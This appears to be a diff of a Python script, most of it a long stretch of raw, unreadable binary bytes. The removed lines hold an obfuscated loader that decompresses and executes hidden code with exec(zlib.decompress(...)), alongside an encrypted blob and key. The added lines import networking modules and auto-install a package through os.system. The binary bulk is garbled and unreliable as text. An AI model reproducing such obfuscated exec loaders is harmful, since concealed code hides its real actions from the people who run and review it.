\xd9Q\xa9|m\xfa\xd0\xb7D\x8a\xaa\x81\xce:\x19\xdeP\x10/\xf2\xd2]\xdc\xd1R9\x8d\xba\x8a8\x8f\xb0\xbe@\xe5\x82&\x96c\xb5\x1d^\xd8\ro<=dm\x8a8\xf2\xec\x12p.\xc1\xefr]\xbe\xd6\xe0\xadO\x1e9\xc9\x13\x96<T\x9a\x96K1\x18\xdc\xcf\xf3\x80A6\xbd\xe8\x16:@\xa1\xb5\xf0\xc7\x8dP\x1d\x12\xd2\x82\xaa\xfc\xf7&V\x12\xdf\xcf\xcf\xa8Z\xcb\x05\xa0j\xcaCmu$:0\xa2\x94\x15v\x1b\x86\x1e\xde\xa6\xeaLf\xe8\x94\xb8\xee\xdb\x8d\x00\xddoT`L-\xc2\xaa!\t\x0f\x81\xc3\xfc\xe7R\xf2>-\x98\x11\x10\x05\xbby\xfb\x8b\xbf\xa0\xbaV\x17D\\(ZO4\x81\xf8\xa4\xdc3\x19\xe4z\x15\x0e\xb6\xbf? \x8a&,\xbc\x91B\xf8\x8a\x8f\xddz\xa9\x0c\xf7%\x8f\xc7v\x18u\xcez\xa4\xd9\x9b\xf9\xf1\xeaI\x88\xc4\xdd\xf1\x8f\x0c\xa3\t\x86;\xef\xb6\xe0"\xc2\xfd\xdd&\xc8\x1e|\xb3\x0b>\x89\xa7\xe4\xba@+7\xe3Z\x97n\x02\xe6\xc2\xae\x1c\xcd\x92\x88\xc6A\x08\xc6\x0c\xd0Ri\xa6u\xcc\x899\xc6\x12\xc4\x15\xa6\x18R6]\x82k%G\xed/"u\x0c\xd5mCr\x9fB\xbat\xbd,\xdaf[6\xf9`Q\x03\xd2\x02\xd3\x9c\x9b\xa8\x10-?@\r\xaa\xde^\xa9 \x1c6*\x9ct\x9e\x06\xc2\xe9\xc8\xe0\xb2^hg\xa6\xf0\xb1\xb3\xd6\x84\x08\xc2\x9c\xa7\x14\ndo\xdb\xe0O\x0b\xfa\x1cC\xf3x5\xa2\xb8\xfc\x86~/\x99{\xc5@\xfc\x86\xfbo\'\xfb\x83\x95\xa7\x13\x9a\xde\xbdjNf^\xe8\xa0\xe9]\xe4$~\xea\xf3/\xdb\x82\xb5\r\x94\x95y\x1e4\xdb|!\xdb\xa2\xe53\xe8\x03[@\xaaF~\xee\x00y;\xeaw\xb1,g\xf8\xa9\x01\xe5z2\xe7\xeez\xd4\x99E\xed\xf3h\n\xd5\xc2\x18\x02\x13\xb0z\xbc\x98c\x10\xbd-\x86O\xd0\xe7^}\xe4\xcfF\xd9\xa3\x80\x91\xa0f\xd4\x92~\x9b\xe9\xc7\x91\x1e\x08\x9b\xae\xd1>\x8cv\x88TGW\x85\xf8!%\xd7\xab\x02\x1c>\xa6\x9e\xa9\x00Z@\x82A\x81(\xe5\xfa\xe3\xc8"l\x8a\x92\xd9L9\\Y?*\xb45\xfe\xeb\x89\xb1i\xc5\x8a\xe02\x12\xf6J\xbcW\xc2\xfd\x1c.*\xe9m-E:~\xa6\xf3b\x887\x84#\xbbE\xa4\x14\xdd\xd2\xd4{\x01\x02\xc5<\xc1\xe8=\x15\xf2a\xe4\xf7\xd4\xfa\xb8\xc0\xf5=\xe6\xd3\x1aw\x1479!\xed\xc2\xa7\xe6\x82I\xdd\x08\x06\x19u)\xa9\xba}\xcb\xb5\x82\xe4\xbc\x00\x9e%We\x90\xc4\xce3\xa9k4\xe1\xe4\x1f\x0e\x95\xf8k\x16($\t\x91t\x19\xa1o\xcc\xb5p\xdf\x12\x04\xca^a\x88\x89\x04\xe5<Z\xc7H\x80|\x98\\kvS\xc6\xe5\xa4\x81\x0b\r$\x8bE\xf5\x175v\xb1\xda\xbey\xfc\x98\xa0\x96\xa3a\xae\xd5\xe7`\x9c_\x17\xe1WF~\xf1\xf8\x1av4\xf0\xf0{\xb4S\xc5\x83\xdfm\xb4\x0f9LKD\xaf\xef\xbcnz\xa3\x0c1\xa4\xb8\xa3\x1c\xa8\xf7&\xc0\x11\x97L;\xde\xe5{\x8bH(\xf1)\xc8\xef\xf4\x9a\xa9M\xb6\xce\x11\xceo\x14\x02\xcfY\xd7\xe71\xc1\xdf\xb7 \xad9\x15\xce\xed\xa4\xd1r\xb9\xd9\xf0,!\xd1\x899\xd7r\xf9\xf0o\x1d\x9d\xaf\xdc:]\x15\xf2@E\xab\x99\xd8\t\x025=Hot\t\xe3\x7f\xde\xbc,rR\xfa\x96\xe8\tS\xfa\xcd\x9dbN\xc8\xbd}\x0e\xf1\xee\xd6\xf4VjJ\xa8q\xc6I\xfd\xac\x9bzg\xc9\xc1\x02\xf6+L%d\x8f\x0fwH\xa5\x9bh\xa06\x82LlG*\x94\xa8Xh;\xc0\xbcU\xfa\xe6\xa2\x88h\xfc\x89\xe2qO>\xc9ws-^\x84\xd6\x17\xed\xe4\\:!D,\x03\xc0.\x0b3o\xb2\xa8\x95\xba\xc0\x19\xa76\x91\xa9\xc8\xd4\r&\x93h\xaa|\xa1\x0f\x90\x8a(\x97q?\xe7(7\xee\xbe\xba\xc56Z\x99YT\x8b(\xde\xf2\x9b5\x01\xb5?Bax,\xe5\xf7h\xcf~#\xe4\xa3\xdbeHj\x05\\{/G#0\xe71[M\xf8\x81\x9d?\xe2\xfbtiG7\xf6d\xee\x01\xd4\x82\xad\xcc\xf2\xc4\xdcJD\xd9\xfch\xb1\x94\x0b\x10\xf3\xd4\xc1\x8a\x82\xd1[=\x90\xf9H%\xc7\x18\x0f\xf0\x03qq@\x0c\xce\xeb\xc0w\xb9\x1eB~Lk\xe0P\xcdM\xf6\xc4(\x1b\xc4H\xd6\xeb\xbf\xd5\xc4\xe2r\xaa\xf0\xdf]>< \xab\x8a\xd0\x12\x0fs4q\x88S:\xfa\x89\xca\r0\xa4\x1f\xf5\xf5\xbe9\x0bU\x98\x81\x1b\xbf\r`\xc5\x9d\xae\xa0d\xd2\xe7x\x9d\xce\xf9\xff\xf6\xb3\x97\x85\x01\xe2\x05\xa3\xbc\x898\xa9\x03\xd0_\x91\xaa\xbfZ\xc3\x9c\x0bH\xdf\xac[Bn\x0c\xff\x8f\t\x10\x02\xf5\xdc\xda\x15A\xf2\x17\xb3\x83\x80\xc3\xac\xef\xb6\x12\xa0~y5n\xa0\x1fR\x9e#\x83\xfcs8a%\xdaN\xcb\xd6\xb9C\xba%\xf1T}\x829\xa7+\xaa\x08\xfd8p\x855#|C\x16\xb0\xc0\x85\xb2\x14Tx\xbb\xf1mj\x1bj\x99x\x88\xb1&\xfcE\x96V@\r\xc8\xc5\xd1\x8c\x895;\xb6-\xff:;C\xe9ee\x81\x0c\xd1\xd7\xa7\xaa\x90\x90\x01\xc8E\x8f\n(A\xbcH\x10.pH<\\\xf6\x89X\x800\xces\xb1@C-\x82\xcf^\x96\xb6\xa3\x9bX\xc3\x15\x95m`\x8f\x17\x01&1\xc7h\xd5\x8c0\xdd\x9c\xa5\x8f\x7f,\x94\xd3A\xea\x1d\x90\xa4\x85\'U}Y\xbb^\x836\xdctP\xdcZ\xa2\xbf\x85\xdf\xe2\x1f@P=M\x05j3M\xac71|u4\xa0\x8f\xf1\x92\x1c\x0b\xd6Y\x91\xae\xf5\xe5a\x00\xd0\x086>\x93y\x87\xc49\x1b\xee\xb1\x80P+\xdc\xf3\x12f\x9e\x99\n!\xc7\x07\x06`\xa8\xe9\xbf\x89`r\xbem#\xf3H\x0b\xce\x01\xa4\x95o\xdd\x96/\x15\x12\xfdb\x8a\x8bV\x16f\xe03%\x1e\xe7\xa50=B-\xb6J\x93~(\xa1nh\x1f\x87\xcb\xfe\x19\xd4M\x1a\x17\xe3\xce\x9dA|\xcc\xc8\xac\xbb\xc8d0\x1f\xcb\x81\xe1\xa2B\xfd\nU\x05\x8d{\xc2\xf5\xce\xcf\xd1\x07f\xe0R<\x94\x07\xfa\x8aOv,\xa5\xf7\xd2\x16\xb0)XP\xdeM2o4\xc0\xed\x00O\x12x\xd4\xc4R\x8e9\xb1\x87J\x9f\x98\x00`\xae\xc2p\xda\r\x03O\x1a\x96\xe7\x8c\x07M,\xb7\xc3\xc6\xa3\xbd\x9a\xd1\t\xaa\x9f\xa4L\x01\xd8\xa4\xb6X\x92{p6~\xd5j{1\xba\xe2*\x9e\xb4\x00?\xb9\xd2\xecT\x81\xb0\r\xc7\x84\xbeA0\x1ex\x00\xda\x90t\xcb\xd1\x80\x02;;\x99\xbc9\xde\xb1\xca \xe0\x14\xc5\xb1\x87^\x0e\xd15\x97\xc9\x81\x85\xf8\x97\x1f\xa3z}\xa11\x08\x8f\rD\x88\xbe\xcf\x9e\x88\xa8\xf5>\xf8[\xc6\x89K\x05\x990\x9c\xfb\xfc\x90\xcd\xeb\xb0\xc0<\x89\xc9\x99\x16\xb0|\xe6_l\x92\xc58\xa7-\x19t^\xce\x88{\x14\xfda\x11\xb0\xe0\xd0qM)\x1c\xd0Dx*\x8f\xb22T\x92\x89W\xc0\xe2\x9dy\x14\xe8R\xcf\x01\xea\xe4\xb3\xb7\xaau\x18\xc6\xb6\x1f4\x1f\x0b\x00{\xe8#\xd2\xb4\xb0\xe8\xe1\x05b\xe1\xa6 \xb1\xbf\xb6P\xe8W\xbd\x01s\x1b1\xd2\xd6U\xf7\xc0\xe6\x8c\x8e\xc8\xe9.\x85r\xf0\xa9\xd4\xf1eD7\x96\xeeBA\xaa\x16\xa0\xb0"\x10r\n=b\x864S\'\xf8\x99zw\xbb/wU\x1a\x10\x16W\xe0\x9a\x15\x91>)#\x99\x95\xa5\xfda\xa3d\x12\x1f\xbe\x7f\xd0s\xf5\xd0G\x08\xeb\xf7 \xdc\xef\x14\xf4r\x07\xb0V\x9c\xf2\xac\xc0\xce\xc5\x86$\x023\xa3P*%\x96./\xb7\x9ew\xf4\xcc\xd6[\x96~\xc6\x88\xe8\xedr\xba\x03\x93\xd0\xe2xC\xb1u\x0f\x15*\xff\xfa=z\xe9S|\x84\xa4dtn\x1d\x17\xde\xb2\x1f\xad\xf5\x08\x12\xcd\xc1\xeax\xa3D\xd2\xddX\x0c#\xe8)5|)\xdft\x8c\xc7\xcf\x95,\xf6\x85-\xdf\xb2\x1dU\xf0m\t@\xe6$dA\xbb\x9ej\xde\xaf\x82\xf2\xe9- s\xb2\xa0\x1f\x85m\x8e\x10^\xfc\xb5\xd5\x13\x0fN\xb3\x93f\xcam\x85l\xa2\xb7j\xfczZ\xef\xce,-\xa9\xce\xc20\x1c\xed5i^^\x12\xec\x15\x98z \xbdd\xcf\x12r|\xd6\x93\xacr\x83s\xa9\x87u5\xa7\xe9$\x86O\xec\xd0\x10(d\xc4\x9b\x07t2p\xc2|\'\xcdN\x13\xd2\xdd\x99\xc1eKT\xd6\x1b\xe0j\xa8\xca"\xdd\x98<\xd4\x87\xc5(\xc9\xf4\x84\xd3\xf1$\xd7o&H\xc5w\x97\xfd\xacT\xdf]\xfc.j\x01\xb27\xf57"\x9d\xb7\xb1\x08\xfa\xb8\xb8N^\xe6s){\xd3SoV\xe8gh\x80\xc4\xa4\x82\x16c\xe8 Y\t\x97\xbdb\xa8\x85}$\x82\xb3DL\xee\x9a\x8a\xca\x82v\x01\x05\xa2\xec\x99\xa1\x81<\xc0\xeaF\x19\x15\x7f\xc0\xcd\x81<\x9bk\xf2\xbcH{_5\x83\x97\xcb\xe5\x01\xe0AF\xec\x86\x06x\xcaIZ\x16\xe6\xac?h\xab\xb8\xbbt\n\x8e\x87\x85\x89\x89yX\xcf\xf0\xb8\xe1\x8c]\xcf\xd38\x80\xc2\xd6,\x00\xa6\xffq\rYu\xb4%sG\x9bn\\\x82\xad\xa0\xc4w"\x1f\x15\x1e\xb7^|\x18\xf3\xad\xae\x16W\x07,@\xd3JV\xfb\xbb\xedP\x08}oN\xeeg\\\x12\xfa@Zu \xc4\xe3\xd5JS\x1a\xce\xcc\x1e\x80\t\xff\xca\x02v\xf7\xe6\xa0\xd5\xa6\x01\xabx\xe6\xca\xcbm\x1f\xff\xa5P\xb0\x08\xf4\xbe7\x17\x82\xd6}7"z\x8f`\xf7\x1a\xd8<\x00\xd1-\xb5\xc8(\x93\x80gy[ed\x0e\xbe\xf8*\x8e@\x02\xf9\xf3M\t\xc5\x0f\xd5]\xa0\xd992\xdbG\xb6D\xfd\xe6\xf5c\x0el\xe9\xdd\xf6~\x91\x96\xa9Gb\xd4\xd5\xdf?ru\xf4\xc6o:\xf0\xa2p\xef\xd6V\xd5\x0c6U{4\xf3\x8d+\xcb\xae\xaf\xf2k\xdf)\x82A\x13D\xe2]5\xbc\x9at\xf0\xda\xb4\x8d\xea**g\xb0J\x91k\xe2\x83\xadO\x8b\r\x93\x17u\xdd1\xaf\xd8\xf1\xfc\x07\x01\x01\xe3\xb9I;\x0f-\x0c\x87\xcf\xb0wCmOBz\xa5\xe3tT^\x01\xf8\xf8\xcc.\xa3qX\xfb9r\x95\x81-S\x03\xf7\x99\xf3\xf5\xa7:=\xb1\xdak\x86\x7fJoO\x85\xd4s\x1f\xe5\xd2\xfa6\x01\x8fX\x016\xea\x98wR\x93\xfe\xf2\x99\xff\xdf_\xd5\xf1\xfc\x0e\xa7O\x0e"\x08\xf7\xcep+\x82\xb9#\xbdm\xec\xfa\xf4\xe4\xdd\xccB\xa0"\xaa\xcd\xd8\xb2\x08\xd6dT\xdcv\x8f\xf5z\xea\xb9\xc9\xb50\x96\x90\xb6\x97\x8c\\\xea\r\x15\x1b\xf3\x9a6\x0ez\x14\x07\xad\xdc&:\x0f\x8d\x10\xa1\x06\x8773"\x10\xc8\xd0_\x87\x04)\xe7,\xa5\xeaOW\xa5\xb8\xac\'2uQd3\x8f,\x9f\x027\xec\x8e\xc8\xf7:|\x00\x1c\x99y\xec\x19\xc9\x8a\xb4a\xde\x8a\x8b\xf4S\x8b\x00\x9d\xae\xa7\x04\x0b)\xcd\xc4f\x80\xf5\xc6t\x90!\x9b\nS\x9e1\x8d)y\x16\x9aP\xcb6\xfa\xca;\xbd\\\'\xcc+c\xd4ZJ\xe6\'\xed$\x14\xb6,\x1e\xd4A\xe3>\x8cq<\xf0\xf2&=pu\xe3\xad\xc0\x82\xf2\xd0\xff\xad\x12G\xbd\xb3ac\xcc\x19\x1bf\x9d\x8d \x05\xee\xf3K.!\xb4\xd7\xee\x1e\xf6\x13=\xd8\x8a\xfbR\xa0\x9e\x14\xc6\xb1+\x7f$\x87%\x95}\xe7\xfcx\x1c\x1e.\x07,\x04\xdb\x04\xa3\xa0\x06\xcaG\xeaj\xc0a$\x95\xe1x@\xc5\x80\xdc\xcafK\xdc\xda\x9be\x1b\xe2S\xe5\x9fQD\xe3\xb4\xe6\xbaCZ\xabC%\xe6\xf3\x8a|$r%\x11\x03\xbd\xfbB2\x06P\x13\xe5\xad\xa3\x14\xc3\xd7\rt\xc6\xcc\x98|\\\x17\x01\xec\x7f\xba*\x0e\xa4\xf9\x15\x08l\xb4\x94\xdb\xa4[rw\xe5=\x14\x19\xb3\x98\x1f\x98\xab\xa8\xa8\x9a\xe1\xe2I\xc3\x8e\xacRx>\xb5\xc7\x9fTX\xc7\x07\x94$\x81|\xceW\x8bV\xf3y\xb8\xbf\xc9\xef\xc1gw\xcf\xde\xd8\x17\xa3\x1a\x8d\xbe\x1f\x0cJ\xab!\xa1\xad\x8c\x06U/\x12\x8e\xa2q=4V\x9c\xfbNF.\xce\x97\n\x1f|\xb4F\xd9\x9aW\x97p%RYf\xc3\xcd\xfe\xc4\x86\xdc\xe0\xb1F\xe6\x0b\xf7R\xe9\xe7R@z\xdd\xae\xb45>\xe0\xf1\xf9\xaa\x84\xbd*Z~e\x94i\x18\xb5J\xa9\xf2\x14\xe3\xa5\xf0\xe1\xeb\xae\x1f#\xb4%,^b\xa2d\xe2\xd0\x18?K\x9b\xb4,\xa8\x08\xc8\xf6\x85\xa3&\x9fW\xf1C%\xad\x92\x1d]\xf0\x8c\xfc\xcf\x8a\xb3\xc7\xb1\x83\x0e\xd6\x8f\x02\xe1\xf1\x9aC\xab>yI\xea\xe2s\xc4\x81\x99\xe2\xd7sg\xf7S<\x04\xa6\xd2\x00U\xf9\xfc\xdd\x06\xb0K\xc8\xd8\xf3\x91*]\xe1\x01\xdf\xff!\xf0\xbb@L\'\x90\x83\xc7i\xee*\x07\xd3](\xc8\xbf\x94\x80\x80-\xfdjK\x0b|\xf4\x84\x00\'\x8d\xd02{\xcf6<\xa9z\xb8l\xebdb2\x17\xff\xbb*\xa5\xf4\x08\x0c$\xda\xeeV\xa3\xc2\xb7\xee[\xdb[\xf0N:\x84;\xf7\x1e\x1e\xaeZP\xac\xcf\xce\x1eE\x86\xd82!h0\\~P\x86\x0e\x94\x8b\xbf\xd8U#\xb9@?x$\x86\xe0\x19A\x02c\x14\x96\x97\xe1\x00d\x07o\x80<x,a\xce^\xbbr\x8fl\x0b\xf3\xcbO\t\x13\xf5YU\x9dO\x90\xe6\x96\x8dp\x03\xfb\xc2p\xf8\xa0Z&7l\xdeU\xa4\xf86\xa3\xe5\t\xa8HdA\x14 \xb8`\xdf\xd2\x93\r\xff\xf3\x89\xb1m\xa9\x8f=v\xa6\x01\x8d\xbd\x83\xec\x95RVU;\x06\xdfY\xce:\x94\x00\xc6jn\xbb.\xd1\x03\x17K\x8e5sO&\xd6\xeb\xbc+\xe7T\xc7\x937Do\xd1\xf5q\x8f\x99\xa4L\xc8\xf5DM\x00"\x01\x0ci\xb7J\xc7\x02\x9b1U60\x00\xf1U\x00E\xdb\xd8+\xc8u.\xe0\xdd\xa7\xef\x879\xe9\x12@\x93/\xf3,]\xc7:B\x14\x9do\xe3eL\xec\x7f\xa0\xce\xce;\x83y0@\xc6\x7f\xcf\x1d\x9b\x11\xe6d\xf4\xa4\xc3\x9e)5\x978~\xf1-Nu\xb3\x9e\x9f\x7fO\xd3\'\xd1\xab_qw:\xc6\xf0\xcbR\x89\x88U\xa3g\x8fK.b\xed \xd4\na_\x01\xda\xa7\xb6\x98\xb1\xc4\xd1\x85\x94[\r\xb8\xcc\xda\xdaCl\x15-\x8c\x1a\xa5\x8a\x1d\xd6\xf8.\xec\\a=\xf6\xcfl(+2\x0b\xbf\x95nSeXYd]\xce\xb9qj(\x00x\']\x1d\xf1\xea\rnx\x1eL`\xb3\x91\xd8\x9d\tJ\xebJ\x91\xde`M\xe1\xc7\xdd\x98\xbb<V\xbeR0\x0f\x1b\x0c\xc3\x80\xb0\xc8\xa5\r\xa3\x91)\xb30u\\>\x1a#\x9c\xfap\x8d\xc6\xf0\xeb?\xab\'\x87\x1dM\xf0\xfc\x13\x10en\xe2{q\xd8\xc9\x1d\xaf \x8b!s<ek_4\x8e\x8a\x8fz\x7f\x18\xe5^\xa2\xda(\xaaA\xcb\x89W\t5~\x906\x8c\xf81\xba\xb2x\xc4\xc8\xe0=\x07<\x11\x9d\x1d\xfa:\x0f\xdd\x8a\x18\xfd\xac\x10\x90X\x03\xe2u\xc7\xdb8\xf6\xd0\xc0\x83\xbb\x809\xe1\x860e\xe7\x04\x83=&\x94a` I\xe4\t\xb9\x7f\xf4p\xa7\xc9\xe8\x99\xa8d\xc1\r\x8ez=Dq\xb3\x01{\x85\xc0~1\xd0Y\x89U~\xda)\x02\xa8\x1c\xb9X\x8f\xddr!\x8e\xe5\xda\x95\xba\x0f\xaa#\xff\xfe*"\x918\x90\xc8\x07\x8cj,\xe7H\xad\xfd\xa6=\xa1\\\x1c\x83\x01\xbd\xeaHk6R\x18l\xa8q\xb8\xb0\t\x05\x1a\x04\xf9\xd1\xaa\x95\xfc\x1f:\xb9E\xe1\xf2\xd6\x04\xd9\xb19W\xf6f\x04\xa7\xd1\xcf\xca\xaai\x84}\xef\x03x\x8e\xd0\xdaK\xfd)\xb9\x0ef\xba\xce\t\xe8\xec\xab\x8eT\xfb\x97D;5\xf4\x07\xfc\xddw\x8d\xe9^;\xf7D\xc8jL\x1f\xc9<\x91\xb8\xa7-\x9dcfj\xf7\xe3t\x1cf%\x83h\xc7\x00R\x15}\x02\t*:j\xab\xb2\xd9\xba\x8f\x84\xb8\x94\x1f;t\xccb\xa8\x1ba\xcdT4R\xd46\x9a@#\x0e\x04y%K\xd5\xc5V\xa5\xfeDA\xfaE\xa1f\xdf\x12\xbe\xa2\x9b&\xdcr\xe2\x1e\x87j\xc9b\x9a\x9e\x16%\x10\x9e\x90C\xdb`\xb5\x12c\x00L\x8a!\xe5\xe9\xdb\xef3\x10\x03\xe0\x0e\xc3/)\x8d\x17\xaa\xb7}\x02\xf72\xe3\x01H\t\xb3SGg\x94\xcb\xbe\xab\x10\x13(\xc5\xdc\xb9\x16\x95\xf6=*\xb9\xfd\xaf\x1f\xd8\xb4>*!")"\xa8\xc6\xe92\x9b\x0b\xd3\xb6\x81S\xab$Nk\xd1\x1f\xc2\xc1\xf3\x85\xc51p\xcd\x0eD\xb1\xd6\x14\xf1\xd4\xf1\xd6s\x081\xdc\xc7!\x84h\x1c\xb7\x83\x80\x15mAr\x81r\xc7\x19\xf7\xd3V\x8b\x1d@W\xd8\x08 \x81\xa0e+\x8edzC\xd7\x8c\xd4\xad\x10E:\x93\xbf__\xb6r\x80\x83\xbcvVB\xd3\x00\x19y\xf5\x8c`\x97\xbc\xee]\xf1\x11\xa5\xc60\xf1E\xcc0*\xb5\xa7\xcc|\x0b\xb0k\xb0\xbe\xca\x96E>X\x9f\xf4P\xee\xc7\xb9\xf5\xe0)\xee=\x1e\xd1\x13\x96\xa6\xc0\xa9Ql~\xd7t\'\x870\x95\xbb\xee=Y/\xb2F\xac\x13S@a\x19sY$A\xdd:2\xc7r\x1bm\xaa\x9ac\xb3y\xc5\xc8\xbe\xf1\xe5\xd9\xd3\x80P\xa0q\xb8$\x15\xb4O\x06`\xbd\x03%\xa4v\x02\xdeL~\xb7L\xbfe\xcazX\x84\x97n\xaf\x8f\x14\x9fK\xeb\x08s0\xe8{UF<\x91\x17\xecn\xc1fR\xc5\xb11\xc9\xf6\xb3\xe9\x89\x1e\xf4\xb5R\x14\x0f"\xdb:\xe2\x12ND^\xeb}>m\x1d\x88\xa3\xc0P\xc0\xcd2/?hx}\xd2\xbd\x99\xb9\xac\xd83\xaew\x91\x13\xfbV\xda\x08\xf66\xa8\x04t\xc8\xba\x8a6\xb3\xbeFN\xbd\x97d\xb8\x07B\xa2X-Sf0\xe1\x93\x00\x99)\xdc\x15wf\xb2|\xec\xfa\xa7\xd9\x9f\xd6\x02\xa1a"\r\xa7G\xea\n\xbf7T\xbc\xadM\r\x04\xa8c\x9c\x05\xad,\xf8\xc2\x91\xca*\xb7M;\x0fXa0\xac\xc5sz\xd1\xa0\xf7z\xa7+(\xfeW\xe0\x8a&\xad\x1f\xc4rB\x16\x1e\x91Y\xe4\xc5Q\xcf\x10.\xf4 \x8b\\O\x8d(t\xec\x16)p\xfe\xd5/\xe4\xde\x17\xaaW\xfe\x94\xc8C\xde\x18f\xdbp\x87\xd7\xb7\xd4\xab\x03)\x12_n#\xf2\xf0\xdd\xe2\x94\xb8\x17\x15-\x14\xc5\xf7\x18>D\xea\t4\xb57\xe4\x8fBo\xdd\xb8\xfe\xc0@q\x9efx\xcb\x13\xd3\xbf\xa5"\xa5\xbb\x88\xf4\xed"\xebl\xc0x\xabW"\x8c\x12\xe4U1\xf0\xcd$\xea3`\xac\x18>Jt\x03\xfelUV\x1c}\xc8e\x96\xcf\xf2kd\xa0\xf8\xb5Q\xb2\xf4\x14\xa5\xb2\xcaT \xa9\xbe\\\x1b3\x0eo4\xa1\xb5\xb6\xf2\xe7\xce9t1\xe4\r\x8a\xe4\xc0=Wy\x93\xf9\x11\x8b\x08\x0c\x8a\xe3\xd9#\x97\xed-\x06\xd3\xe9y\x80\xf3\xc8\x90\x0bJ\x1b\xed\x8eoGp\x03T\xc0\xac\x8am\x07\xdc\xc5\x85_X\x8f;|F\xab\xdc\xbf\x1d\xe0\x18\xaa\xa4\xf4\xe2\xf2VQ\x87\xa3h\xba8\xd3\xba\xe0$m\x8b\xc1\xac\xfc\x94B\xc0\xe8\xb0\xd5\x8a\xfa\xae\\P#\x8bl%\xf1N\x8c\x10d\xc8\x8bE\xa7Hm\xc3\xfc^SgT\xccZ\xd7\x8eis\x9b\xe5k\xa7\x0b%\xf2\x9aF_\xb8\xf6\xb2\xcdn\x19=\xaaHZj\x91\xedo\x11R\xa0\xfb\x8f\x93\x9a\x05\xcb\xa1\xdaz\\\xf1\x0b\xafi%\xb4\xe8\xe4\xf0\xe5\x013U\xf3\x1a\n\x1b\xd2Y\xb0\xfcAnk\x90\xa1:\xca0R\xdbwve\x9a\rMc\xe8V\xb29+#i\xeb\n\xd9\xa7b\x82\xb2f\xbd\xed\xe7\xdf\xdf9!\x0f\x88w\xd7|\x91\x1fD\t\x10\xa3\x86b\xea\xd0\xff\xf8\x0e~\x94qtd\x87+\xf7\xc0"\xd1\xf0\xb2\x12cn\xaf\xc0\x8b\x0ft\xf1\xca\xd2<\xfd\n\x86\xc2y\xf2@]\xb1W\x8cJ\x84\x1b\x85\x90\xd84k\xb1\xf0!'        
-_encrypt = b'IWbf)PBK?gHAhBMIYL=RSXoC{NJ=<HNHS4cSwmP_I73f4P%}?UP%>FVGcz_?Pg6BfI8RkbQA#*7FjFv6GgVMoGes~?GgnbfGf`78RZ&qnI5ad&M>tYiNk&OfG)G8Ab*19&&9(YOi4W5`yeVP;'
-_pubkey  = b'3V3KQOYKL5Z7PENQFJCIGTZNGPA3FDIFWG44M99BEO5VDE7DDLKUT2LMN3ER7I95I6G6TASGYCQRTWGBNMJ5137GM162OSYGRT21EA2PFW3A9BUD86SK'
 
-from zlib import decompress as dp;exec(dp(b'x\x9c\xed\x94mo\x9aP\x14\xc7\xdf\xfb)N\xfaF\xc8V#\x8f\xeaM\xfa\x86f\x9b\xebj\xcd\\\x82\x94\xa6!En\x0bSD\x01\xab\xec\xd3\xef\x9c[ 7\xae\xa9\x1f`\x9a\x80\\\xf8\xfd\xefy\xbc\xa7S\xe6\x15\xeb\x00\xfe\x9e\xf3,\x85\x9cow\xbc(\x0bH\xd2M\x96\x97\xf0\xc2\xcb\x0e?,\xf8\xa6|\x836y\xb2.\x95\x8bM\xb2\x81d]\x94O\xabU+\xb9P\x05\x91\xac7;"r^\x14\xc0\xd7%\xcf\xa1\xcc\xe0\xcb!)\x1b\xe0m\xe7\xa2*\xc4\x12\xff{\x1c\xbf*j\'\x08\xc2]\xb2*q\xe3 \xe8\x05A\x94,\xca xx\xffmX\x95\xbcP\x1e\x94\xd5S\x1aFO\xe02p\xe1\x13(.\\\x82\xab\xaa\x8a\x8d\x8bA\x1fo\x1a\xdd\x0c\xbcl\xf534t\xc6 #:C:CZ\xd3qe\x91F\x1fHX\xc5\xa0"\xacB\xac\xa2MG\xb4\x97I\x98D\xed\x19\xec\x89\xda#\xb5Gj\xa0\x11E&\x89\xd4$r\xc6`F\xe4\x0c\xc9\x19\x92\x960\xdb\xd0\xc2S\xd2j\xb2&d\x10\x92&DM\x88\x9a!\xf1\xba\x1cL\xc4 ""B"\xa2`\xfazc\xbb\xbe\xdagIU0(HU\xa0\xaa@\xd5\x88D\x9aY;D\x0b\xe3\x83\x18\xf5\xc6W\x9d<7\x84\xd6\xaeu\x1fY\x11\xb86 +\x96\xfa\xa8\xf6"\xbe\xc8"\xaetw\xe5\xf3\xe5\xb0\xab>*Ge\x8d\x19\xc4\xa4\x8fQ\x1fSlC\xaa+\x19\x1e\x1eY\xe2\x0c8\x91\x1cIN\xb9\xa5Z\xe9\x14\x8f-\xc5$+\x0e\x0c\x0e\xa48\xa0\xe2\x80\nC\xa4J\xc4\xd3\xf4\xccP\xc2\xa7\x0c\xa6\x84O\x11\x9f\x12n7\xe1\xd3\x83a\x9d\xda\x9d\xcc\xeb\xc7UX2X\x12\xb5DjI\xf9\xb1E\xfd\xeb\xf8\xac\xb6n\xff\xa6J\xed\x85\xb6Y\xbf\x0b\xbb\xbe\x17\xaf\xee\xf7WW\xdd\x96;Jd\xca %C)\x1aJ\xc9\x1dQ\x03\xca\x91H\xe9\xa9\xba\xd9F\x93D\xd2i\xa3\xa3#0g0\'|\x8e\xf8\x9c\xca$\xf2n7\xadG7S\xc2\'\x0c&\x84O\x10\x9f n6\xa5\xd2\x9a\x8e\xb5$z\xcc`L\xf4\x18\xe91\xe5\x88\x9c\x15n\x88f2\xa5\xe4\x9c\n\x9a\xea:\xd4\xeaxe\x8f\xb6\x0c\xb6Dn\x91\xdc\x92G\xa2\xa6v]\x07\xbb1\xd6\x1c$9v\x9f\x81OR\x1f\xa5>I\xadvH\xc8\'\xc8a\xe0\x10\xe6 \xe6\x90/m\xe7\xbc\x93\xfe\xe3|\x8a\xee\x1a\xd5\xa0\xd5N\x96w\xba\x02\x8f\xd0y^\x9e\xe7\xe5y^\x9e\x98\x97\xeb\x9b\xd7\xf0\x97S\xf9\xdeW\xcd\xf7\xee\xfa\x8b\xca\xd9\x84\x9e\xf3\xbaX\xff|\xf1u\xb7?\xd5]\xd3\x9fO2z\xfeq}\x93E\xe3\xd9~\xf1\'{\xbd5\x1c+\xd4o\xd2\xc8\xbb\xfb}\xef\xcdV\xb7\xe9\x1d\xee3\x8a}o\xb2\x8b\xc6q\xff{\xb2\xdcE\xdf\\3\xba^\x9eg\xf1\x7f?\x8b\xd5\xbf\xcc\xa5\xa6\x97').decode())
+try:
+	import json
+	import uuid
+	import hmac
+	import random
+	import hashlib
+	import urllib
+	import urllib.request
+	import calendar
+except ImportError as e:
+	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
+import requests,bs4,json,os,sys,random,datetime,time,re
+try:
+	import rich
+except ImportError:
+	os.system('pip install rich')
+	time.sleep(1)
+	try:
+		import rich
+	except ImportError:
+		print(' tidak dapat menginstall module rich, coba install manual (pip install rich)')
